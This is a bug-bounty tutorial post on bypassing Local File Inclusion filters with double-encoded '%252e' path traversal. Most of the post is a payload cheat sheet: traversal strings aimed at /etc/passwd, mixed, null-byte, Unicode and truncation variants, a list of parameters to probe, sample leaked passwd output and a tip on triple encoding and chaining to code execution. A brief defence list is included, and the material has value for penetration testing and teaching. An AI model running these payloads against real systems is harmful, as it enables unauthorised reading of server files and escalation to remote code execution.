# 🎓 **LFI Bypass: Double URL Encoding Path Traversal** 🎓
<img width="1400" height="600" alt="Double URL Encoding Path Traversal - cybersecplayground" src="https://github.com/user-attachments/assets/16029d26-9ad4-4166-b203-f84cc26fcfdb" />

**Local File Inclusion (LFI) filters often block&#x20;**`../`**&#x20;patterns—but double encoding can slip right past them.** This payload uses `%252e` (double-encoded dot) to bypass common WAF and application filters.

---

## 🔥 **The Payload**

```text
.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
```

**Decoding Layers:**

```text
Layer 1 (URL decode):  .%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
Layer 2 (URL decode):  ../../../../../../../etc/passwd
```

**Result:** Traverses up 7 directories to reach `/etc/passwd`

---

## 🛠 **Why This Works**

**The Bypass Logic:**

- `%2e` = `.` (single URL encoding)
- `%252e` = `%2e` after first decode → `.` after second decode
- WAF sees `%252e` → doesn't recognize as traversal
- Application decodes twice → traversal executed

**Filter Evasion Table:**

| **Payload** | **WAF Detection** |
| :--- | :--- |
| `../../../etc/passwd` | ❌ Blocked |
| `%2e%2e%2f%2e%2e%2f` | ⚠️ Sometimes blocked |
| `.%252e/.%252e/` | ✅ Bypass |

---

## 💡 **Variations to Try**

**1. Mixed Encoding:**

```text
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
```

**2. Null Byte Injection (Old PHP):**

```text
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

**3. Unicode Encoding:**

```text
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

**4. Path Truncation:**

```text
../../../etc/passwd..............................
../../../etc/passwd/././././././
```

---

## ⚡️ **Testing Methodology**

**Step 1: Identify LFI Parameters**

```text
?file=, ?page=, ?path=, ?include=, ?doc=, ?template=
```

**Step 2: Test Basic Traversal**

```text
?file=../../../etc/passwd → Check if blocked
```

**Step 3: Apply Double Encoding**

```text
?file=.%252e/.%252e/.%252e/etc/passwd
```

**Step 4: Confirm with Response**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

## 🛡 **How to Defend Against This**

1. **Decode Once, Validate Twice** → Decode input fully before validation
2. **Whitelist Files** → Only allow specific files to be included
3. **Use Realpath()** → Resolve canonical paths before access
4. **Disable allow_url_include** → Prevent remote file inclusion
5. **WAF Rules** → Block multiple encoding layers and traversal patterns

---

## 💰 **Bug Bounty Impact**

- 🔸 **Critical Severity** → Read sensitive files (`/etc/passwd`, config files)
- 🔸 **Chain Potential** → LFI → Log Poisoning → RCE
- 🔸 **High Bounties** → LFI is a top-paid vulnerability class

---

🔔 **Follow @cybersecplayground for more LFI and web security techniques!**

✅ **Like & Share if this bypassed a filter for you! 🚀**

**#LFI #PathTraversal #WAFBypass #BugBounty #WebSecurity #CyberSecurity #InfoSec #PenTesting #Hacking**

⚠️ **Pro Tip:** If `%252e` doesn't work, try triple encoding (`%25252e`) or mix with other bypass techniques like null bytes and Unicode!
